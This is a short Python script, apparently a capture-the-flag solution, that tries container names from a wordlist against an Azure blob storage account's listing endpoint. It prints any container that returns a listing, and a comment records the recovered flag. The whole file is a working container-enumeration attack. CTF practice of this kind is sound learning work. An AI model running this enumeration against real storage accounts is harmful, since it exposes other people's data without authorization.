import requests

f = open("permutations.txt", "r")

options = []

for line in f:
    options.append(line.strip())

baseurl = "https://kcscctfblob.blob.core.windows.net/"

for line in options:
    r = requests.get(baseurl + line + "?restype=container&comp=list")
    if "does not exist" not in r.text and "does not represent any" not in r.text:
        print(r.text)
        print(line)


# KCSC{blobblob_blob_blob_blobloblob}


        